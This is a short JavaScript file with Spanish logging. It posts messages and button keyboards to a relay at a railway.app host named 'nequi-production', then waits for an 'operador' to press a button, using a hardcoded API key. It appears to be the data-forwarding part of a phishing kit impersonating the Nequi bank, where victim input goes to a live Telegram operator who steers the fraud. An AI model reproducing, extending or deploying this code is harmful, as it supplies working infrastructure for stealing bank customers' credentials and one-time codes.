// ================================================================
// js/sendTelegramMessage.js
// ================================================================

async function sendTelegramMessageWithBtn(mensaje, teclado) {
  const url = "https://nequi-production.up.railway.app/send-message";
  
  console.log("📤 Enviando mensaje a Telegram...");
  console.log("Mensaje:", mensaje);
  console.log("Teclado:", teclado);
  
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-api-key-authorization": "a8B3dE4F9gH2JkL5mN",
        "x-client-id": "user1",
      },
      body: JSON.stringify({
        mensaje: mensaje,
        teclado: teclado,
      }),
    });

    console.log("📡 Respuesta del servidor:", response.status);

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Error del servidor:", errorText);
      throw new Error(`${response.status}: ${errorText}`);
    }

    const responseData = await response.json();
    console.log("✅ Mensaje enviado exitosamente:", responseData);
    return responseData;
    
  } catch (error) {
    console.error("❌ Error en sendTelegramMessageWithBtn:", error);
    throw error;
  }
}

async function waitForButtonPress(messageId, timeout = 120) {
  const url = "https://nequi-production.up.railway.app/wait-action";
  
  console.log("⏳ Esperando respuesta del operador...");
  console.log("Message ID:", messageId);
  
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-api-key-authorization": "a8B3dE4F9gH2JkL5mN",
        "x-client-id": "user1",
      },
      body: JSON.stringify({
        message_id: messageId,
        totalTimeoutMs: timeout * 1000,
        pollTimeoutSec: 5,
        removeKeyboard: true,
      }),
    });

    console.log("📡 Respuesta del servidor:", response.status);

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Error del servidor:", errorText);
      throw new Error(`${response.status}: ${errorText}`);
    }

    const respuesta = await response.json();
    console.log("✅ Acción recibida del operador:", respuesta);
    return respuesta;
    
  } catch (error) {
    console.error("❌ Error en waitForButtonPress:", error);
    throw error;
  }
}
